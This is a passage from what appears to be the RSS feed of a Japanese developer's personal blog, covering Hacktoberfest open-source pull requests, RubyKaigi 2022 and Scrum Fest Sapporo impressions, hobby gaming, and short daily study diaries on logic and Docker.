&lt;span style="color:#66d9ef">User&lt;/span> &lt;span style="color:#66d9ef">Load&lt;/span> (&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#ae81ff">6&lt;/span>ms) &lt;span style="color:#66d9ef">SELECT&lt;/span> &lt;span style="color:#e6db74">&amp;#34;users&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>* &lt;span style="color:#66d9ef">FROM&lt;/span> &lt;span style="color:#e6db74">&amp;#34;users&amp;#34;&lt;/span> &lt;span style="color:#66d9ef">WHERE&lt;/span> &lt;span style="color:#e6db74">&amp;#34;users&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#e6db74">&amp;#34;name&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&lt;/span> $1 &lt;span style="color:#f92672">[[&lt;/span>&lt;span style="color:#e6db74">&amp;#34;name&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;アリスター&amp;#34;&lt;/span>&lt;span style="color:#f92672">]]&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="読んだやつ">読んだやつ
&lt;span>&lt;a href="#%e8%aa%ad%e3%82%93%e3%81%a0%e3%82%84%e3%81%a4">#&lt;/a>&lt;/span>
&lt;/h3>&lt;ul>
&lt;li>史上最強の哲学入門という本を読んでいる
&lt;ul>
&lt;li>ある哲学の対抗策としてまた別の哲学がでてきて〜という流れでいろんな哲学の話がでてきてハチャメチャにおもろい&lt;/li>
&lt;li>人生コンプレックスがあるので哲学に頼っている。これは哲学が好きな人は人生にコンプレックスがあることを意味していません。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>EviさんとFakerがおすすめしていたのでカーネギーの道は開けるを読んでいる
&lt;ul>
&lt;li>曰く自己啓発書なんだけど、そのなかでも体験とか書いてあってちゃんとしている感を感じる。何事も捉え方。&lt;/li>
&lt;li>特に洋書に感じるのだが個人の体験の話がめっちゃ多い。説得力増す感じはする。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h3 id="なんか書いとけ欄">なんか書いとけ欄
&lt;span>&lt;a href="#%e3%81%aa%e3%82%93%e3%81%8b%e6%9b%b8%e3%81%84%e3%81%a8%e3%81%91%e6%ac%84">#&lt;/a>&lt;/span>
&lt;/h3>&lt;ul>
&lt;li>ポケモンを四人でやるのおもろい&lt;/li>
&lt;li>waltでスシローのデリバリーするの便利すぎる&lt;/li>
&lt;li>健康は大事&lt;/li>
&lt;li>一日の始まりにObsidianでDiaryNoteを取るようにした。最低限やることをタスクとしてメモしてそれだけはやるようにしている。前はSlackのtimesに書いていたがSlackで文章書くのはめんどいので移行した。&lt;/li>
&lt;/ul></description></item><item><title>Hacktoberfest 2022で建てたOSSへのPR</title><link>https://qwyng.dev/posts/20221105_hacktoberfest/</link><pubDate>Sat, 05 Nov 2022 14:56:26 +0900</pubDate><guid>https://qwyng.dev/posts/20221105_hacktoberfest/</guid><description>&lt;p>有給消化の一ヶ月間好き放題してたらRubyの全てを忘れてしまったのでHacktoberfestの機会にいくつかPRをだした。&lt;br>
なおHacktoberfest対象レポジトリ以外にもPRは建ててます。&lt;/p>
&lt;h3 id="pundit">Pundit
&lt;span>&lt;a href="#pundit">#&lt;/a>&lt;/span>
&lt;/h3>&lt;p>&lt;a href="https://github.com/varvet/pundit/pull/745">https://github.com/varvet/pundit/pull/745&lt;/a>&lt;/p>
&lt;p>rubocop-rspecには外部Gemが追加したRspecのDSLをLintの対象にできる&lt;a href="https://docs.rubocop.org/rubocop-rspec/third_party_rspec_syntax_extensions.html">機能&lt;/a>がある。&lt;/p>
&lt;p>PunditのRspec用DSLである&lt;code>permissions&lt;/code>を対応させた。good first issueという感じですぐ作業が完了したので特にいうことはなし。&lt;/p>
&lt;h3 id="bake-test-external">bake-test-external
&lt;span>&lt;a href="#bake-test-external">#&lt;/a>&lt;/span>
&lt;/h3>&lt;p>&lt;a href="https://github.com/ioquatix/bake-test-external/pull/2">https://github.com/ioquatix/bake-test-external/pull/2&lt;/a>&lt;/p>
&lt;p>開発中のGemに依存している別のGemのテストを、開発中のGemを使って実行できるGem。Samuel Williamsさん製。&lt;br>
後述するPRの作業中に必要になったのでPRを建てた。&lt;/p>
&lt;p>このGemの仕組みとしてテストしたいGemのレポジトリをcloneしてきてGemfileにローカルのGemを参照させるよう加筆する仕組みになっているのだけれど、gemspecで参照されることのみ想定していたのかGemfileに開発中のGemの名前が書いてあるとGemfileに同じ名前が２つのってしまっていたので修正した。&lt;br>
PRの内容がいちいち正規表現合成してたり良くないコードだったんだけど&lt;br>
&lt;code>I'm generally okay with this, but I'm a little concerned it's fragile. However, it's not critical it breaks.&lt;/code>&lt;br>
というオブラートに包んだコメントもらった後にすぐマージしてくれた。なお上からちゃんと修正してくれていた。押しかけコミット押し付け太郎になってしまい反省しています。&lt;/p>
&lt;h3 id="omniauth">omniauth
&lt;span>&lt;a href="#omniauth">#&lt;/a>&lt;/span>
&lt;/h3>&lt;p>&lt;a href="https://github.com/omniauth/omniauth/pull/1095">https://github.com/omniauth/omniauth/pull/1095&lt;/a>&lt;/p>
&lt;p>ここからはまだマージされてないPR。&lt;br>
bake-test-externalについて知ったのはこのPRが理由。
bake-test-externalを使ってomniauthのCIにdeviseのテスト実行を追加するPR。issueにgood first issueラベルが貼ってあったので取り組んでみた。確かにomniauthの変更でdeviseがバグってないか確認できたら便利そうではある。&lt;br>
マージされるかはわからないが、メンテナーの人が最近忙しいみたいなことをレポジトリのどこかで書いていた気がするのでクローズされるにしろマージされるにしろ時間かかりそう&lt;/p>
&lt;h3 id="puma">Puma
&lt;span>&lt;a href="#puma">#&lt;/a>&lt;/span>
&lt;/h3>&lt;p>&lt;a href="https://github.com/puma/puma/pull/3006">https://github.com/puma/puma/pull/3006&lt;/a>&lt;/p>
&lt;p>Twitterでメンテナーの方が宣伝してたので便乗してPRを建てた。&lt;/p>
&lt;blockquote class="twitter-tweet">&lt;p lang="en" dir="ltr">An opportunity for Puma contribution - write some tests for an already-completed feature &lt;a href="https://t.co/3cQREdtJH7">https://t.co/3cQREdtJH7&lt;/a>&lt;/p>&amp;mdash; Nate Berkopec (@nateberkopec) &lt;a href="https://twitter.com/nateberkopec/status/1585862608640352256?ref_src=twsrc%5Etfw">October 28, 2022&lt;/a>&lt;/blockquote> &lt;script async src="https://platform.twitter.com/widgets.js" charset="utf-8">&lt;/script>
&lt;p>完全に人の褌で相撲をとっている状態である。&lt;br>
自分でやったのはSymbolとString変換したりテストちょろっと足したぐらい。&lt;br>
このPRはメンテナーの方からスタンプとラベル貰えたのですぐにクローズされることはなさそう。
&lt;code>sd_notify&lt;/code>って概念初めて知ったし勉強になった。&lt;/p>
&lt;h3 id="あとがき">あとがき
&lt;span>&lt;a href="#%e3%81%82%e3%81%a8%e3%81%8c%e3%81%8d">#&lt;/a>&lt;/span>
&lt;/h3>&lt;p>こいつgood first issueばっかやっとるな。&lt;/p></description></item><item><title>スクラムフェス札幌感想</title><link>https://qwyng.dev/posts/20221105/</link><pubDate>Sat, 05 Nov 2022 14:36:27 +0900</pubDate><guid>https://qwyng.dev/posts/20221105/</guid><description>&lt;p>前職の人が発表するということでオンライン参加、ワイワイ。&lt;br>
以下プレゼンごとの感想。&lt;/p>
&lt;h3 id="keynote1---これまでのスクラムのこれから">Keynote1 - これまでのスクラムのこれから
&lt;span>&lt;a href="#keynote1---%e3%81%93%e3%82%8c%e3%81%be%e3%81%a7%e3%81%ae%e3%82%b9%e3%82%af%e3%83%a9%e3%83%a0%e3%81%ae%e3%81%93%e3%82%8c%e3%81%8b%e3%82%89">#&lt;/a>&lt;/span>
&lt;/h3>&lt;p>&lt;a href="https://confengine.com/conferences/scrum-fest-sapporo-2022/proposal/17858/keynote1-">https://confengine.com/conferences/scrum-fest-sapporo-2022/proposal/17858/keynote1-&lt;/a>&lt;/p>
&lt;p>スクラムの歴史についての発表。&lt;/p>
&lt;ol>
&lt;li>昔は農地の広さや単純な労働力の大きさが権力の大きさを担保していた。&lt;/li>
&lt;li>軍隊のような指示体型のほうが大量の労働力を効率よく動かせた。&lt;/li>
&lt;li>現代になって農地からだせる価値より知識労働から生み出せる価値のほうが大きくなってきた。&lt;/li>
&lt;li>現代権力は情報や知的労働力の大きさによって担保されるようになった。&lt;/li>
&lt;li>良い開発チームを持っている権力者が有利！そのためには軍隊のような指示体型ではなくチーム自身に考えさせよう！&lt;/li>
&lt;li>そしてスクラムへ&amp;hellip;&lt;/li>
&lt;/ol>
&lt;p>みたいな運びだった。最初にアジャイルやスクラムが導入されたとしてもプロジェクトの成功率自体は向上してないとはっきり言ったあとに説明されたのでわかりやすかった。スクラムはプロダクトのためではなくチームのためにやるものという前提が大事っぽい。&lt;/p>
&lt;p>アジャイルとスクラムをちゃんと分けて会話できる下地として素晴らしいキーノートだった。&lt;/p>
&lt;h3 id="楽しいとチームは強くなる専任スクラムマスターの知られざる奮闘">「楽しい！」とチームは強くなる　～専任スクラムマスターの知られざる奮闘〜
&lt;span>&lt;a href="#%e6%a5%bd%e3%81%97%e3%81%84%e3%81%a8%e3%83%81%e3%83%bc%e3%83%a0%e3%81%af%e5%bc%b7%e3%81%8f%e3%81%aa%e3%82%8b%e5%b0%82%e4%bb%bb%e3%82%b9%e3%82%af%e3%83%a9%e3%83%a0%e3%83%9e%e3%82%b9%e3%82%bf%e3%83%bc%e3%81%ae%e7%9f%a5%e3%82%89%e3%82%8c%e3%81%96%e3%82%8b%e5%a5%ae%e9%97%98">#&lt;/a>&lt;/span>
&lt;/h3>&lt;p>&lt;a href="https://confengine.com/conferences/scrum-fest-sapporo-2022/proposal/17496">https://confengine.com/conferences/scrum-fest-sapporo-2022/proposal/17496&lt;/a>&lt;/p>
&lt;p>楽しい雰囲気という切り口での発表。
アイスブレイクのお話も参考になったが、中でも特に良かったのは振り返りの場で「障害はなんですか？」と聞くより「こんなことが問題っぽい？」と一緒に考えているような問いかけをするというもの。一緒に考えている感も出せるし、議論の火種にもなるとのこと。ファシリって自分の意見を言わないのが鉄則だと思ってたんだけど、議論の火種をつくるこの手法は有用なファシリの技術の一つだと思った。人間何かを例示されると意見が出せがち。
また、社会人として上司とスクラムマスターの期待値をちゃんと揉んでるのも良かった。自分が空回りしないようにするのは大事ですね。&lt;/p>
&lt;h3 id="keynote3-アジャイルな開発の原点">Keynote3: アジャイルな開発の原点
&lt;span>&lt;a href="#keynote3-%e3%82%a2%e3%82%b8%e3%83%a3%e3%82%a4%e3%83%ab%e3%81%aa%e9%96%8b%e7%99%ba%e3%81%ae%e5%8e%9f%e7%82%b9">#&lt;/a>&lt;/span>
&lt;/h3>&lt;p>&lt;a href="https://confengine.com/conferences/scrum-fest-sapporo-2022/proposal/17525/keynote3">https://confengine.com/conferences/scrum-fest-sapporo-2022/proposal/17525/keynote3&lt;/a>&lt;br>
アメリカで新しく開発組織を立ち上げたらしい方の発表。&lt;br>
CIの設定、テスト、スプリントプランニング・レビュー、当たり前のことを当たり前にやったという話が良かった。テスト書いてるときにマネージャー陣に進捗が出てないと言われたが、必要なことなんですといって進めたとのこと。&lt;br>
日本だとわりと慎重に悪い状況も伝えてくれることが多いが、アメリカではあんまり悪い状況伝えてくれなかったという話が面白かった。&lt;br>
海外のスクラムの資料では透明性が強調されていることが多いと思っていたけど、こういう背景もありそう。&lt;/p>
&lt;h3 id="全体通しての感想">全体通しての感想
&lt;span>&lt;a href="#%e5%85%a8%e4%bd%93%e9%80%9a%e3%81%97%e3%81%a6%e3%81%ae%e6%84%9f%e6%83%b3">#&lt;/a>&lt;/span>
&lt;/h3>&lt;p>皆さんアイスブレイクがうまかった印象。チームビルディングが好きな人が発表しているからだと思う。クイズ大会で盛り上がるみたいな発表もあった。&lt;br>
心理的安全性の土台となる部分を自ら作っていこうという人が多くて素晴らしい会でした。運営の皆さんありがとうございました。&lt;/p></description></item><item><title>RubyKaigi 2022 感想</title><link>https://qwyng.dev/posts/20220916/</link><pubDate>Fri, 16 Sep 2022 19:00:00 +0900</pubDate><guid>https://qwyng.dev/posts/20220916/</guid><description>&lt;h2 id="セット個別感想">セット個別感想
&lt;span>&lt;a href="#%e3%82%bb%e3%83%83%e3%83%88%e5%80%8b%e5%88%a5%e6%84%9f%e6%83%b3">#&lt;/a>&lt;/span>
&lt;/h2>&lt;p>&lt;a href="https://rubykaigi.smarthr.co.jp/2022/plans/1dd5b4a1-a2c3-4d30-8213-3ca8a3999ae0">見たセットのリスト&lt;/a>&lt;br>
僕の浅い理解で感想を書いているので正しい情報は各自スライドみるなり録画みるなりしてほしい。正直全然わかってない。&lt;/p>
&lt;p>&lt;a href="https://rubykaigi.org/2022/presentations/ko1.html#day1">Making &lt;em>MaNy&lt;/em> threads on Ruby - RubyKaigi 2022&lt;/a>&lt;br>
RubyでM:Nスレッドやっていくぞという話。
M:Nスレッドってユーザーレベルで（ユーザーレベルで作成された）スレッドをスケジューリングさせてM個のOSのスレッドにN個のユーザーレベルスレッドをマッピングさせるってことだと思ってるのだけれど、その説明もスライドに盛り込まれていて勉強になった。&lt;br>
Rubyは今まではConcurrent（並行）ではあったが、Parallel(並列）ではなかったというのはRactorとThreadの違いを端的に表現してくれていて良かった。&lt;br>
Fiberとの比較で、Fiberはスケジューラーを各必要があるかチューニングできる、NaNyではスケジューラーを意識する必要がないという紹介がされていて、なるほどMaNyのほうがRubyっぽいなという感想を持った。&lt;/p>
&lt;p>&lt;a href="https://rubykaigi.org/2022/presentations/yukihiro_matz.html#day2">Matz Keynote - RubyKaigi 2022&lt;/a>&lt;br>
ブログを書くと良いらしい&lt;/p>
&lt;p>&lt;a href="https://rubykaigi.org/2022/presentations/Kenta%20Murata.html#day2">Method-based JIT compilation by transpiling to Julia - RubyKaigi 2022&lt;/a>&lt;br>
単純な足し算でもRubyやPythonでは回りくどいアセンブリ命令の呼び出しをする必要があるが、RubyからJuliaに変換してコンパイルするといい感じの命令を吐いてくれるぞ！という話だった気がする。RubyからJuliaのコードになっていて凄い。難しいことはJuliaにやらせようというスライドも面白かった。&lt;/p>
&lt;p>&lt;a href="https://rubykaigi.org/2022/presentations/m_seki.html#day2">Create my own search engine. - RubyKaigi 2022&lt;/a>&lt;br>
ポケモンカード検索エンジンを作ったぞというお話。ポケカで県代表になった方らしい。&lt;br>
終始作った物を楽しそうに発表しているのが印象的だった。（もちろん技術も興味深かった）&lt;br>
作ってみた系を聞くと自分もなにか作ってみたくなる。&lt;/p>
&lt;h2 id="yjit">YJIT
&lt;span>&lt;a href="#yjit">#&lt;/a>&lt;/span>
&lt;/h2>&lt;p>本当になにもわかっていない。&lt;br>
x86とarmの共通点を探して、プラットフォームによらない表現を生成したり、オブジェクトを名前ではなくインスタンス変数やfrozenかどうかだけとかで判断するとか、もう本当によくわからない。&lt;br>
とんでもなくすごい人達が作った物を無料で使わせてもらってありがとうございます。&lt;/p>
&lt;h2 id="物理参加">物理参加
&lt;span>&lt;a href="#%e7%89%a9%e7%90%86%e5%8f%82%e5%8a%a0">#&lt;/a>&lt;/span>
&lt;/h2>&lt;p>物理参加の一番のメリットは話を真面目に集中して聞けるところだなと感じた。家からだと多分どのお話も最後まで聞けなかったと思う。雰囲気が与える影響は大きいし、ちゃんと聞いて感想を語り合いたいという目的ができるのが良い。&lt;br>
その他にもTwitterは知ってるけど実在するとは知らなかった人と会えたり、同僚氏の同僚氏とお話できたり楽しかった。 &lt;br>
&lt;a href="https://ruby-puzzles-2022.cookpad.tech/">https://ruby-puzzles-2022.cookpad.tech&lt;/a>も面白くて17問目まで解いた。18問目以降は大変そうだったので回答例をみたいところ。&lt;br>
旅行先としての三重は食事も酒も美味しいし四日市はかっこいいし最高だった。霜降りの松阪牛は少量食べれば十分なことがわかった。&lt;/p>
&lt;h2 id="ラップアップ">ラップアップ
&lt;span>&lt;a href="#%e3%83%a9%e3%83%83%e3%83%97%e3%82%a2%e3%83%83%e3%83%97">#&lt;/a>&lt;/span>
&lt;/h2>&lt;p>前回はエンジニアなりたてぐらいに福岡で現地参加したのだが、話されていることの1％もわからなかった。今回は10％くらいはわかったかもしれない。&lt;br>
RubyKaigiにくると自分の矮小さがヒシヒシとわかってモチベーションになるのでまた次回も参加したい。&lt;br>
他の参加者の方、スポンサー方、登壇者の方、運営の方、本当にありがとうございました。&lt;/p></description></item><item><title>趣味紹介</title><link>https://qwyng.dev/posts/20220831/</link><pubDate>Wed, 31 Aug 2022 20:51:44 +0900</pubDate><guid>https://qwyng.dev/posts/20220831/</guid><description>&lt;p>趣味紹介とは趣味を紹介することである。&lt;/p>
&lt;h3 id="基本情報">基本情報
&lt;span>&lt;a href="#%e5%9f%ba%e6%9c%ac%e6%83%85%e5%a0%b1">#&lt;/a>&lt;/span>
&lt;/h3>&lt;p>名前 大澤広朗&lt;br>
出生地 茨城県土浦市&lt;br>
身長と年齢が大谷翔平&lt;/p>
&lt;p>以下全部趣味のゲームの話&lt;/p>
&lt;h3 id="magic-the-gathering">Magic: The Gathering
&lt;span>&lt;a href="#magic-the-gathering">#&lt;/a>&lt;/span>
&lt;/h3>&lt;p>MTGを初めたのは高校生頃で、ミラ傷やイニストラードの頃のスタンダードをやっていた記憶がある。大学生や社会人になってからも結構遊んでいて、現在もちょこちょこ大会には出ている。プロポイント持ってることを一生擦っている。&lt;br>
現在の手持ちのデッキはパイオニアが赤単、赤青果敢、赤白英雄的。レガシーがURデルバー。EDHは百合子とウィノータとガルタ。
基本１マナクリーチャーが好きでコントロールはあまり使わない。&lt;/p>
&lt;h3 id="league-of-legends">League of Legends
&lt;span>&lt;a href="#league-of-legends">#&lt;/a>&lt;/span>
&lt;/h3>&lt;p>好きなレーンはSupport。スレッシュが好き。あとタリヤも好き。D2になったことを一生擦っている。&lt;br>
クソゲーなので引退したいが神ゲーなので引退できない。&lt;/p>
&lt;h3 id="友達と遊ぶ時に遊ぶやつ">友達と遊ぶ時に遊ぶやつ
&lt;span>&lt;a href="#%e5%8f%8b%e9%81%94%e3%81%a8%e9%81%8a%e3%81%b6%e6%99%82%e3%81%ab%e9%81%8a%e3%81%b6%e3%82%84%e3%81%a4">#&lt;/a>&lt;/span>
&lt;/h3>&lt;p>Apex、ポケモンユナイト&lt;/p>
&lt;h3 id="対戦ゲーム以外で好きなゲーム">対戦ゲーム以外で好きなゲーム
&lt;span>&lt;a href="#%e5%af%be%e6%88%a6%e3%82%b2%e3%83%bc%e3%83%a0%e4%bb%a5%e5%a4%96%e3%81%a7%e5%a5%bd%e3%81%8d%e3%81%aa%e3%82%b2%e3%83%bc%e3%83%a0">#&lt;/a>&lt;/span>
&lt;/h3>&lt;p>UNDERTALE、ペルソナシリーズ、Falloutシリーズ、TESシリーズ&lt;/p></description></item><item><title>日記を30日完走した感想</title><link>https://qwyng.dev/posts/20220830/</link><pubDate>Tue, 30 Aug 2022 23:49:30 +0900</pubDate><guid>https://qwyng.dev/posts/20220830/</guid><description>&lt;h3 id="完走した感想">完走した感想
&lt;span>&lt;a href="#%e5%ae%8c%e8%b5%b0%e3%81%97%e3%81%9f%e6%84%9f%e6%83%b3">#&lt;/a>&lt;/span>
&lt;/h3>&lt;p>有給期間中日記を30日継続してきた。内容は本当にしょうもないことが多く読んでもらえるような内容ではなかったと思う。&lt;br>
完走した感想だが、特にすごい効果があるわけではなかった。日記を書かなくても読書や大学院の課題はやっていたと思う。 &lt;br>
日記をたくさん書いてみて、Gitのコミットの粒度やコメントの大切さがわかったのでその点は日記を書いて良かった。&lt;/p>
&lt;h3 id="やればよかったこと">やればよかったこと
&lt;span>&lt;a href="#%e3%82%84%e3%82%8c%e3%81%b0%e3%82%88%e3%81%8b%e3%81%a3%e3%81%9f%e3%81%93%e3%81%a8">#&lt;/a>&lt;/span>
&lt;/h3>&lt;ul>
&lt;li>もっと日々の何気ないことを文章で書けばよかった
&lt;ul>
&lt;li>飲みに行ったとか筋トレしたとか喫茶店いったとか&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>本と一日で読み切るのは難しく、なんとも細切れな日記となってしまったので、- 本の感想は単体で記事にしたほうが良かった。&lt;/li>
&lt;li>PRなり競プロ問題の提出なり単発的な学びを習慣化させても良かった。&lt;/li>
&lt;li>記事のタイトルをもっと考えればよかった
&lt;ul>
&lt;li>記事のタイトルがただの日付だと見返すきが起きない&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>全般的に振り返りづらい記事の羅列になってしまった。未来の自分が読みたくなるようなタイトルや粒度にすることが肝要だろう。&lt;/li>
&lt;/ul></description></item><item><title>20220829</title><link>https://qwyng.dev/posts/20220829/</link><pubDate>Mon, 29 Aug 2022 23:02:12 +0900</pubDate><guid>https://qwyng.dev/posts/20220829/</guid><description>&lt;h3 id="やったこと">やったこと
&lt;span>&lt;a href="#%e3%82%84%e3%81%a3%e3%81%9f%e3%81%93%e3%81%a8">#&lt;/a>&lt;/span>
&lt;/h3>&lt;ul>
&lt;li>美容院の予約&lt;/li>
&lt;li>健康診断の予約&lt;/li>
&lt;li>ソウルハッカーズ2&lt;/li>
&lt;/ul>
&lt;h3 id="学び">学び
&lt;span>&lt;a href="#%e5%ad%a6%e3%81%b3">#&lt;/a>&lt;/span>
&lt;/h3>&lt;ul>
&lt;li>全くのゼロからの論理学を読了した。
&lt;ul>
&lt;li>最後に形式的証明の伏線回収があってよかった。&lt;/li>
&lt;li>妥当式の全てがその公理系の定理になることが公理系の完全性、定理の全てが妥当式であることを公理系の健全性という。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul></description></item><item><title>20220828</title><link>https://qwyng.dev/posts/20220828/</link><pubDate>Sun, 28 Aug 2022 22:24:53 +0900</pubDate><guid>https://qwyng.dev/posts/20220828/</guid><description>&lt;h3 id="やったこと">やったこと
&lt;span>&lt;a href="#%e3%82%84%e3%81%a3%e3%81%9f%e3%81%93%e3%81%a8">#&lt;/a>&lt;/span>
&lt;/h3>&lt;ul>
&lt;li>
&lt;p>みなとみらいでコーヒー豆を買った。
&lt;img src="https://lh3.googleusercontent.com/YzpRlAvIPihxsweuZYW3Z6ZFc1nAmj-nSqsdLFfLJ10_M2psTZeKmyJxSXytg0RgEhSYJfVV-tKoIH3ILPp5CvWY0tzIqsW6wSJZa-r2ymOU87BbDSXhCyLqxcOfXuytqGHy_j99nQ=w2400" alt="">&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ゼロからの論理学を読み進めた&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="学び">学び
&lt;span>&lt;a href="#%e5%ad%a6%e3%81%b3">#&lt;/a>&lt;/span>
&lt;/h3>&lt;ul>
&lt;li>&lt;code>∀X∃yFxy&lt;/code>と&lt;code>∃y∀xFxy&lt;/code>は区別する必要がある。
&lt;ul>
&lt;li>&lt;code>∀X∃yFxy&lt;/code>は全てのxについてあるyが存在する。&lt;/li>
&lt;li>&lt;code>∃y∀xFxy&lt;/code>は全てのxがFxyなyが存在する。&lt;/li>
&lt;li>議論領域を人間、Fxyの関係述語をxは愛を愛していると解釈すると
&lt;ul>
&lt;li>&lt;code>∀X∃yFxy&lt;/code>は全ての人間は愛している人が存在する。&lt;/li>
&lt;li>&lt;code>∃y∀xFxy&lt;/code>は全ての人間が愛しているあるyさんが存在する。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul></description></item><item><title>20220827</title><link>https://qwyng.dev/posts/20220827/</link><pubDate>Sat, 27 Aug 2022 22:55:16 +0900</pubDate><guid>https://qwyng.dev/posts/20220827/</guid><description>&lt;h3 id="やったこと">やったこと
&lt;span>&lt;a href="#%e3%82%84%e3%81%a3%e3%81%9f%e3%81%93%e3%81%a8">#&lt;/a>&lt;/span>
&lt;/h3>&lt;ul>
&lt;li>LOLとApexをやった&lt;/li>
&lt;/ul>
&lt;blockquote class="twitter-tweet">&lt;p lang="ja" dir="ltr">LOL配信&lt;a href="https://t.co/LFeDKi09E4">https://t.co/LFeDKi09E4&lt;/a>&lt;/p>&amp;mdash; とるめん (@qwyngg) &lt;a href="https://twitter.com/qwyngg/status/1563423092575154176?ref_src=twsrc%5Etfw">August 27, 2022&lt;/a>&lt;/blockquote> &lt;script async src="https://platform.twitter.com/widgets.js" charset="utf-8">&lt;/script>
&lt;ul>
&lt;li>
&lt;p>ソウルハッカーズ2を進めた&lt;/p>
&lt;ul>
&lt;li>研究者のメガネのデザインがネクストレベルだったので驚いた。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>まったくのゼロからの論理学を読み進めた&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="学び">学び
&lt;span>&lt;a href="#%e5%ad%a6%e3%81%b3">#&lt;/a>&lt;/span>
&lt;/h3>&lt;ul>
&lt;li>&lt;code>∀x(Fx∧Gx)&lt;/code>は「全てのxについてFxでありかつGxである」ということを表している論理式、、「全てのFxであるものがGxである」ということを意味しているわけでないということ。
&lt;ul>
&lt;li>全ての会社員は人間であり、かつ怠け者だ(&lt;code>∀x(Fx∧Gx)&lt;/code>)という論理式は全ての人間は怠け者であることを意味していない。&lt;/li>
&lt;li>全ての人間は哲学者であり、かつ怠け者だという文章は全ての哲学者は怠け者だという解釈にはならない。&lt;/li>
&lt;li>ここらへんを具体的に言語化してあって良かった。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>その論理式をどう解釈しても真になる式を妥当式という
&lt;ul>
&lt;li>&lt;code>∀x(Fx⇒Gx)∧¬Ga)⇒¬Fa&lt;/code>&lt;/li>
&lt;li>議論対象、Fxの具体的な述語、Gxの具体的な述語、aの値、どう解釈しても真になる。
&lt;ul>
&lt;li>前件が真で後件が偽になることがありえない&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul></description></item><item><title>20220826</title><link>https://qwyng.dev/posts/20220826/</link><pubDate>Fri, 26 Aug 2022 21:44:49 +0900</pubDate><guid>https://qwyng.dev/posts/20220826/</guid><description>&lt;h3 id="やったこと">やったこと
&lt;span>&lt;a href="#%e3%82%84%e3%81%a3%e3%81%9f%e3%81%93%e3%81%a8">#&lt;/a>&lt;/span>
&lt;/h3>&lt;ul>
&lt;li>関数プログラミングの宿題をやった。とりあえず9月頭締切のものは終わり。&lt;/li>
&lt;li>ソウルハッカーズ2を買った。悪魔のモデルが凄い&lt;/li>
&lt;li>社の人とマリオカートした&lt;/li>
&lt;/ul>
&lt;h3 id="学び">学び
&lt;span>&lt;a href="#%e5%ad%a6%e3%81%b3">#&lt;/a>&lt;/span>
&lt;/h3>&lt;ul>
&lt;li>マリオカートが下手&lt;/li>
&lt;li>自然数は無限&lt;/li>
&lt;/ul>
&lt;p>スマホから更新してるのでレイアウトが変かもしれない&lt;/p></description></item><item><title>20220825 最終出社</title><link>https://qwyng.dev/posts/20220825/</link><pubDate>Thu, 25 Aug 2022 21:44:49 +0900</pubDate><guid>https://qwyng.dev/posts/20220825/</guid><description>&lt;h3 id="やったこと">やったこと
&lt;span>&lt;a href="#%e3%82%84%e3%81%a3%e3%81%9f%e3%81%93%e3%81%a8">#&lt;/a>&lt;/span>
&lt;/h3>&lt;p>株式会社グロービス最終出社日でした。&lt;br>
めっちゃ楽しかったです。感謝します。感謝岬。&lt;br>
もうやんカレーとシズラーをはしごして人生を知り、腹を破裂せた。&lt;/p>
&lt;p>&lt;img src="https://lh3.googleusercontent.com/Y_0D-HviHcib5F0A_WNxlrbQlEcXjx9ton6dFng4DWvKJLK3jDC_9LU2zWJaVrIQhl8eZYFEldaFYgxYFiLMGxYRqKXIFQCtGNoAJ7JYaA0kLNMdqSV8Eki6jAQi3xFJWu3UiN7QSQ=w2400" alt="">&lt;/p>
&lt;h3 id="学び">学び
&lt;span>&lt;a href="#%e5%ad%a6%e3%81%b3">#&lt;/a>&lt;/span>
&lt;/h3>&lt;ul>
&lt;li>チャンキーサルサとハラペーニョ食べたあとにワインを飲むと甘い。&lt;/li>
&lt;li>野菜と果物の間に境界線はない。&lt;/li>
&lt;li>ミルクとカフェお互いがお互いを高め合うそんな関係になりたい。&lt;/li>
&lt;li>ポカミスをしてしまって明日も出社することになった。&lt;/li>
&lt;/ul></description></item><item><title>20220824</title><link>https://qwyng.dev/posts/20220824/</link><pubDate>Wed, 24 Aug 2022 23:29:12 +0900</pubDate><guid>https://qwyng.dev/posts/20220824/</guid><description>&lt;h3 id="やったこと">やったこと
&lt;span>&lt;a href="#%e3%82%84%e3%81%a3%e3%81%9f%e3%81%93%e3%81%a8">#&lt;/a>&lt;/span>
&lt;/h3>&lt;ul>
&lt;li>GOならわかるシステムプログラミングの読書会最終日を終えた。参加者の皆さんアザした。&lt;/li>
&lt;li>関数プログラミングの宿題を進めた。人間は自然数を理解していますか？&lt;/li>
&lt;li>パイオニア17時の部、青赤デルバーで2-1&lt;/li>
&lt;/ul>
&lt;h3 id="学び">学び
&lt;span>&lt;a href="#%e5%ad%a6%e3%81%b3">#&lt;/a>&lt;/span>
&lt;/h3>&lt;ul>
&lt;li>人は30超えるともうやんがキツくなるらしい。&lt;/li>
&lt;li>やよい軒ハイボール90円はバグ&lt;/li>
&lt;li>リンカーの存在。&lt;/li>
&lt;li>Dockerはlinuxカーネルのコントロールグループと名前空間という機能を利用してカーネルを共有しつつ独立した環境を作っている。&lt;/li>
&lt;li>完全な仮想化という概念と準仮想化という概念がある。
&lt;ul>
&lt;li>完全な仮想化はホストOSの上に仮想化ソフトウェアが稼働し、ゲストOSを稼働させる。センシティブなシステムコールはハイパーバイザがわりこんで処理をする。&lt;/li>
